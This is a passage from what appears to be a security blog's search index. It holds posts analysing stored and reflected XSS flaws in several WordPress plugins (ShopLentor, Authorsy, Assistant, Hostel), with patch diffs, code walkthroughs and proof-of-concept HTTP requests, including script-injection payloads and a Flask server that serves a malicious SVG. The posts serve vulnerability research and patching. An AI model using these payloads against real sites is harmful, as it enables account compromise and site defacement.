(like contributor) can become attack vectors if the plugin does not enforce proper protections. Updating plugins regularly is a simple and effective defense. ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Download Manager Plugin \u003c= 3.3.24 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-06","objectID":"/posts/2025-10-06-cve-2025-10146/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-10146 Analysis \u0026 POC","uri":"/posts/2025-10-06-cve-2025-10146/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress ShopLentor Plugin.","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/"},{"categories":["CVE Analysis"],"collections":null,"content":"A vulnerability in the ShopLentor plugin prior to version 3.2.0 allows an attacker with contributor privileges to inject malicious code into a block’s CSS. This CSS is then loaded inline into the page and can lead to Stored XSS when previewed or rendered in a browser. CVE ID: CVE-2025-58990 Product: WordPress ShopLentor Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 3.2.0 CVSS severity: Low (6.5) Required Privilege: Contributor ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. ShopLentor: v3.2.0 (vulnerable) and v3.2.1 (fixed) diff tool: meld or any tool capable of comparing the two versions to see differences Activated WooCommerce plugin: WooCommerce must be activated before installing the ShopLentor Plugin ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare differences between the vulnerable and fixed versions. The notable difference is in the file woolentor-blocks/includes/classes/Manage_Styles.php. Vulnerable version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // No user permission check // No sanitization of CSS before saving update_post_meta( $post_id, '_woolentor_css', $params['block_css'] ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $params['block_css'] ); } Fixed version: public function save_block_css( $request ){ $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); // Only admin or the post author are allowed $post = get_post( $post_id ); if ( ! $post || ( ! current_user_can('manage_options') \u0026\u0026 get_current_user_id() !== (int) $post-\u003epost_author ) ) { return ['success' =\u003e false, 'message' =\u003e __('No permission')]; } // Sanitize data before saving $block_css = $this-\u003esanitize_css_content( $params['block_css'] ); update_post_meta( $post_id, '_woolentor_css', $block_css ); $wp_filesystem-\u003eput_contents( $dirname . $filename, $block_css ); } The patch uses current_user_can('manage_options') to check for admin privileges: If the user is admin =\u003e the first part ! current_user_can('manage_options') = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. If the user is the author =\u003e the latter part get_current_user_id() !== (int) $post-\u003epost_author = false =\u003e the whole \u0026\u0026 expression is false =\u003e passes. Patch Diff\r","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How It Works\rpublic function save_block_css( $request ){ try{ global $wp_filesystem; if ( ! $wp_filesystem || !function_exists('WP_Filesystem') ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $params = $request-\u003eget_params(); $post_id = sanitize_text_field( $params['post_id'] ); if ( $post_id == 'woolentor-widget' \u0026\u0026 $params['has_block'] ) { update_option( $post_id, $params['block_css'] ); return [ 'success' =\u003e true, 'message' =\u003e __('Widget CSS Saved.', 'woolentor') ]; } $filename = \"woolentor-css-{$post_id}.css\"; $upload_dir_url = wp_upload_dir(); $dirname = trailingslashit( $upload_dir_url['basedir'] ) . 'woolentor-addons/'; if ( $params['has_block'] ) { update_post_meta( $post_id, '_woolentor_active', 'yes' ); $all_block_css = $params['block_css']; WP_Filesystem( false, $upload_dir_url['basedir'], true ); if( ! $wp_filesystem-\u003eis_dir( $dirname ) ) { $wp_filesystem-\u003emkdir( $dirname ); } update_post_meta( $post_id, '_woolentor_css', $all_block_css ); if ( ! $wp_filesystem-\u003eput_contents( $dirname . $filename, $all_block_css ) ) { throw new \\Exception( __('You are not permitted to save CSS.', 'woolentor' ) ); } return [ 'success' =\u003e true, 'message' =\u003e__('WooLentor Blocks css file update.', 'woolentor' ) ]; } else { delete_post_meta( $post_id, '_woolentor_active' ); if ( file_exists( $dirname.$filename ) ) { wp_delete_file( $dirname.$filename ); } delete_post_meta( $post_id, '_woolentor_css' ); return [ 'success' =\u003e true, 'message' =\u003e __('WooLentor Blocks CSS Delete.', 'woolentor' ) ]; } } catch( \\Exception $e ){ return [ 'success' =\u003e false, 'message' =\u003e $e-\u003egetMessage() ]; } } The save_block_css() function in the Manage_Styles class is responsible for saving or deleting the block CSS. The application retrieves post_id and block_css from the request. Special case: if post_id == 'woolentor-widget' =\u003e the CSS is saved to wp_options. Normal post case: If there is a block (has_block = true): Mark the post as active (_woolentor_active). Save the CSS into the wp_postmeta table with meta_key = _woolentor_css. mysql\u003e select * from wp_postmeta where meta_key='_woolentor_css'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 27 | 69 | _woolentor_css | body:{} | | 687 | 1416 | _woolentor_css | body:{} | +---------+---------+----------------+------------+ Write the CSS file into the uploads directory (woolentor-css-{post_id}.css). Write CSS\rIf there is no block (has_block = false): Remove the active flag and CSS meta. Delete the CSS file if it exists. 👉 The likely attack scenario is a typical Stored XSS: a user with role contributor (who cannot publish) creates a post and injects an XSS payload into the block CSS. The payload is stored in the database or a file; a higher-privileged user previews the content before publishing, the payload is loaded/rendered in the browser and executes, causing XSS. To understand how the data is rendered, search the plugin for _woolentor_css. Since CSS is stored in wp_postmeta under the meta_key = _woolentor_css, the plugin will query this value and insert it directly into HTML. Search Meta Key\rgenerate_inline_css() fetches block CSS from wp_postmeta with meta_key = _woolentor_css and from the file woolentor-css-{$post_id}.css — if the file exists it calls get_contents and inlines the CSS for the post with the given $post_id; otherwise it falls back to wp_postmeta. The content is placed inside a \u003cstyle type=\"text/css\"\u003e\u003c/style\u003e tag. The Manage_Styles class registers a REST API route in the register_routes function: public function register_routes( $namespace ){ register_rest_route( $namespace, 'save_css', [ [ 'methods' =\u003e 'POST', 'callback' =\u003e [ $this, 'save_block_css' ], 'permission_callback' =\u003e [ $this, 'permission_check' ], 'args' =\u003e [] ] ] ); // other route } register_rest_route() creates a REST API endpoint at: /wp-json/{namespace}/save_css When a POST request is made to this endpoint: Word","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rUse a user with the contributor role to create any post and note its ID. Send a POST request to http://localhost/wp-json/woolentor/v1/save_css with an XSS payload: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Response 👉 The X-WP-Nonce header is missing for user authorization. Open the page source (Ctrl+U) of the post edit page: view-source:http://localhost/wp-admin/post.php?post=\u003cpost_id\u003e\u0026action=edit Search for wpApiSettings in the source and extract the nonce value. wpApiSettings\rSend the request including the X-WP-Nonce header with the obtained value: POST /wp-json/woolentor/v1/save_css HTTP/1.1 Host: localhost X-WP-Nonce: f79ec79e4b Content-Type: application/json { \"post_id\":1416, \"has_block\":true, \"block_css\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } Preview post Preview\r👉 XSS succeeds. Inspect to see how the code was modified. View source code Code\r","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-58990 vulnerability in ShopLentor \u003c= 3.2.0 allows a contributor to inject malicious CSS leading to Stored XSS when an admin/author previews or views the post. The 3.2.1 patch adds permission checks and CSS sanitization to prevent exploitation. Key takeaways: Always combine permission checks and input sanitization when handling user-submitted data. Low-privilege roles (like contributor) can still be an attack vector if APIs are not properly protected. Stored XSS in WordPress commonly occurs when data saved to DB/files is rendered inline without sanitization. Timely plugin updates are a simple and effective mitigation. ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress ShopLentor Plugin \u003c= 3.2.0 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-05","objectID":"/posts/2025-10-05-cve-2025-58990/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-58990 Analysis \u0026 POC","uri":"/posts/2025-10-05-cve-2025-58990/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Authorsy Plugin.","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Authorsy plugin for WordPress prior to version 1.0.6. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-27006 Product: WordPress Authorsy Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.0.5 CVSS severity: Medium (6.5) OWASP Top 10: A1: Broken Access Control Required Privilege: Subscriber Although the description requires Subscriber privileges, it can actually be exploited Unauthenticated. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Authorsy: v1.0.5 (vulnerable) and v1.0.6 (patched) Diff tool: meld or any tool to compare two versions ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin allows custom CSS, stores it in wp_options, and injects it directly into the \u003cstyle\u003e tag on pages. However, users can interact with the API to modify CSS without proper access control, leading to Broken Access Control and potential XSS if malicious payloads are inserted. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse a diff tool to compare vulnerable and patched versions. Notice clear differences in two files: core/settings/api-settings.php and core/enqueue-inline/enqueue-inline.php. File core/enqueue-inline/enqueue-inline.php public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single()){ $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } User data is inserted without validation, leaving it vulnerable to XSS. Patched version: public function custom_inline_css() { $custom_css = ''; $ea_custom_css = authorsy_get_option('ea_custom_css'); if(is_single() \u0026\u0026 !empty($ea_custom_css)){ // Sanitize and escape to prevent XSS $ea_custom_css = wp_strip_all_tags($ea_custom_css); $ea_custom_css = esc_html($ea_custom_css); $custom_css.= $ea_custom_css; } $custom_css .= \" :root { --ea-color-main: $primary_color; } \" wp_add_inline_style('authorsy-custom-css', $custom_css); } Sanitization ensures only safe CSS is injected. Diff showing changes in enqueue-inline.php to sanitize custom CSS\rFile core/settings/api-settings.php Vulnerable: 'permission_callback' =\u003e function () { return true; }, Patched: 'permission_callback' =\u003e function () { return current_user_can('manage_options'); }, The permission callback now restricts access to admins, mitigating Broken Access Control and indirectly reducing XSS risk. Diff showing REST API permission callback changes in api-settings.php\r","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rcustom_inline_css() is hooked to wp_head. When WordPress renders the \u003chead\u003e section, this function concatenates user options from authorsy_get_option() into $custom_css and adds it inline: $custom_css = authorsy_get_option('ea_custom_css'); Since this data is stored in the database, this is Stored XSS. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\rSend a POST request to /wp-json/authorsy/v1/settings with an XSS payload: POST /wp-json/authorsy/v1/settings HTTP/1.1 Host: localhost Content-Type: application/json { \"primary_color\":\"\u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e\" } The payload closes the existing \u003cstyle\u003e and injects a \u003cscript\u003e tag. Visiting any page will execute the XSS. Injected XSS payload in via custom CSS\r\u003cstyle\u003e :root { --ea-color-main: \u003c/style\u003e\u003cscript\u003ealert(document.domain)\u003c/script\u003e\u003cstyle\u003e; } \u003c/style\u003e ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:2:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-27006 vulnerability in Authorsy \u003c= 1.0.5 demonstrates Broken Access Control combined with XSS. Root causes: REST API lacks proper access control (permission_callback always true). Custom CSS is inserted without sanitization, enabling injection of \u003cscript\u003e tags. Nonce verification does not stop execution when invalid, making security checks ineffective. Key takeaways: Always use proper permission_callback to prevent Broken Access Control. Sanitize and escape user input before rendering in HTML/CSS/JS to prevent XSS. ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Authorsy Plugin \u003c= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-04","objectID":"/posts/2025-10-04-cve-2025-27006/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-27006 Analysis \u0026 POC","uri":"/posts/2025-10-04-cve-2025-27006/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Assistant Plugin.","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Assistant plugin for WordPress prior to version 3.6.2. This could allow an attacker to inject malicious code (e.g., redirect scripts, ads, or other HTML payloads) into the website, which would execute when visitors open the page. CVE ID: CVE-2025-53307 Product: WordPress Assistant Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c= 1.5.2 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Assistant: v1.5.2 (vulnerable) and v1.5.3 (patched) Diff tool: meld or any tool capable of comparing two versions ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe application displays user-provided image content directly via a URL without validating or fully checking the MIME type. This allows an attacker to supply a file disguised as an image, which when processed by the browser, executes malicious code → resulting in an XSS vulnerability. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable version and the patch. Diff between vulnerable and patched version\rIn this case, there are significant differences between the two versions. For easier tracking, the change log identifies where the XSS patch was applied: Changelog 1.5.3 (2025-09-08) - Changes to support the integration of Assistant in Beaver Builder version 2.10 - Fixed dark mode issues on the Home app and sidebar. - Security: Fixed a potential XSS vulnerability in the \"image proxy\" 👉 The vulnerability is located in backend/src/Hooks/ImageProxy.php. Observing the differences between the two versions: Differences in the render_image function of ImageProxy.php\rThe changes occur in the render_image function, which: Accepts a URL parameter from the query string ($_GET['url']). Sends a request from the server to that URL to fetch the content. Prevents SSRF using wp_safe_remote_get. If the content has a Content-Type header starting with image/, then: Sends the same Content-Type header back to the client. Echoes the file content to the browser. The browser displays the image not directly from the original source but through the WordPress server. SVG files also have a Content-Type starting with image/ and can contain embedded JavaScript → XSS can occur. The patch added an additional check to verify the actual MIME type of the file to prevent XSS via SVG or maliciously disguised files. $filesystem = self::filesystem(); $tmpfile = tempnam( '/tmp', 'assistant' ); $filesystem-\u003eput_contents( $tmpfile, $body ); $validimage = wp_get_image_mime( $tmpfile ); $filesystem-\u003edelete( $tmpfile ); if ( ! $validimage ) { return false; } wp_get_image_mime() uses internal image processing (based on the binary data of the file) to determine the actual MIME type. If the result is not a valid image → returns false. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rIn the __construct of the ImageProxy class, the render_image() method is called via the 'init' action hook. The 'init' hook runs early in WordPress loading, after core objects are initialized but before output is sent to the browser. render_image is called only if the current user has permission to edit other users’ posts and the $_GET['fl_asst_image_proxy'] parameter exists. 👉 Accessing /wp-admin/?fl_asst_image_proxy=value1\u0026url=http://yoursite/image-path triggers render_image and returns the image content to the browser. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:2:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect XSS\rCreate a simple web page returning an SVG containing an XSS payload: from flask import Flask, Response app = Flask(__name__) @app.route('/') def home(): return 'Hello, World!' @app.route('/svg') def about(): svg = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003csvg xmlns=\"http://www.w3.org/2000/svg\"\u003e \u003cscript\u003ealert(document.domain)\u003c/script\u003e \u003c/svg\u003e\"\"\" return Response(svg, mimetype=\"image/svg+xml\") Send a request with the url parameter pointing to https://yoursite/svg: http://localhost/wp-admin/?fl_asst_image_proxy=abc\u0026url=https://yoursite/svg 👉 Successful for Unauthenticated because as long as the user has permission, accessing the URL triggers XSS in the victim’s browser. The attacker does not need to log in. SVG with XSS payload displayed via image proxy\r","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#detect-xss"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-53307 vulnerability in the WordPress Assistant plugin (\u003c= v1.5.2) allows XSS via render_image() because it does not validate the actual file MIME type. Version v1.5.3 patched this by verifying the file content before returning it to the browser. Key takeaways: Do not trust the Content-Type header from HTTP responses. Always validate the actual MIME type of the file. ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet WordPress Assistant Plugin \u003c= 1.5.2 is vulnerable to Cross Site Scripting (XSS) ","date":"2025-10-03","objectID":"/posts/2025-10-03-cve-2025-53307/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-53307 Analysis \u0026 POC","uri":"/posts/2025-10-03-cve-2025-53307/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Hostel Plugin.","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the Hostel plugin for WordPress prior to version 1.1.5.8. An attacker could exploit it to target high-privilege users like admins. CVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: Cross Site Scripting Affected Versions: \u003c 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Hostel Plugin: v1.1.5.7 (vulnerable) and v1.1.5.8 (patched) Diff tool: meld or any tool that can compare two versions ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe root cause is the lack of sanitization and escaping for a parameter before rendering it on the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable version and the patch. The differences are clearly in two files: views/bookings.html.php and controllers/bookings.php File views/bookings.html.php \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo @$_GET['ob']?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The parameter ob is directly taken from $_GET['ob'] and echoed into an HTML attribute without escaping, making it vulnerable to Reflected XSS, since an attacker can inject payloads into the query string. Patched Code \u003cp align=\"center\"\u003e \u003c?php if($offset \u003e 0):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset - $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[previous page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e \u003ca href=\"admin.php?page=wphostel_bookings\u0026type=\u003c?php echo $type?\u003e\u0026offset=\u003c?php echo $offset + $page_limit?\u003e\u0026ob=\u003c?php echo esc_attr($_GET['ob'] ?? '')?\u003e\"\u003e\u003c?php _e('[next page]', 'wphostel')?\u003e\u003c/a\u003e \u003c?php endif;?\u003e \u003c/p\u003e The patch uses esc_attr() to safely encode $_GET['ob'] before echoing into the HTML attribute. Diff showing patched and vulnerable code\rSource: $_GET['ob'] is client-controlled input from the URL query string. Sink: echoed in an HTML attribute ob=\u003c?php echo @$_GET['ob']?\u003e. 👉 Because the source does not go through controller logic, the diff of controllers/bookings.php is less relevant. ","date":"2025-10-02","objectID":"/posts/2025-10-02-cve-2025-6234/:2:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-6234 Analysis \u0026 POC","uri":"/posts/2025-10-02-cve-2025-6234/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rFor $_GET['ob'] to be echoed in the HTML attribute of \u003ca\u003e, the if condition enclosing \u003ca\u003e must be true: \u003c?php if($offset \u003e 0):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e \u003c?php if($count \u003e ($page_limit + $offset)):?\u003e // ob=\u003c?php echo @$_GET['ob']?\u003e \u003c?php endif;?\u003e 👉 The key condition is if($offset \u003e 0). If true, the XSS can occur regardless of the second condition. The views/bookings.html.php file cannot be accessed directly; it must be included by the controller using include(). The $offset variable is initialized in the controller and passed to the view. Searching the plugin controllers shows that $offset is set in the default branch (listing bookings) of the static manage() method in class WPHostelBookings in controllers/bookings.php. Controller Code class WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET['do']) { // other logic // list bookings default: $type = empty($_GET['type']) ? 'upcoming' : sanitize_text_field($_GET['type']); $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); $dir = empty($_GET['dir']) ? 'ASC' : $_GET['dir']; if($dir != 'ASC' and $dir != 'DESC') $dir = 'ASC'; $odir = ($dir == 'ASC') ? 'DESC' : 'ASC'; $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; $bookings = $wpdb-\u003eget_results(\"SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \".WPHOSTEL_BOOKINGS.\" tB JOIN \".WPHOSTEL_ROOMS.\" tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\"); $count = $wpdb-\u003eget_var(\"SELECT FOUND_ROWS()\"); if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); break; } } } Analysis of $offset $offset comes from the URL parameter $_GET['offset']: Absent → defaults to 0 Present → cast to integer via intval() $offset = empty($_GET['offset']) ? 0 : intval($_GET['offset']); Analysis of $page_limit $page_limit is fixed at 20 for pagination $page_limit = 20; $limit_sql = empty($_GET['export']) ? $wpdb-\u003eprepare(\"LIMIT %d, %d\", $offset, $page_limit) : ''; This ensures SQL returns up to 20 records starting from $offset. XSS condition in view: The payload displays only if if($offset \u003e 0) → requires at least 1 offset Exploit requires at least 2 bookings in the database to render payload The controller passes results to the view using: if(@file_exists(get_stylesheet_directory().'/wphostel/bookings.html.php')) include get_stylesheet_directory().'/wphostel/bookings.html.php'; else include(WPHOSTEL_PATH.\"/views/bookings.html.php\"); WPHOSTEL_PATH is the absolute path to the plugin directory. 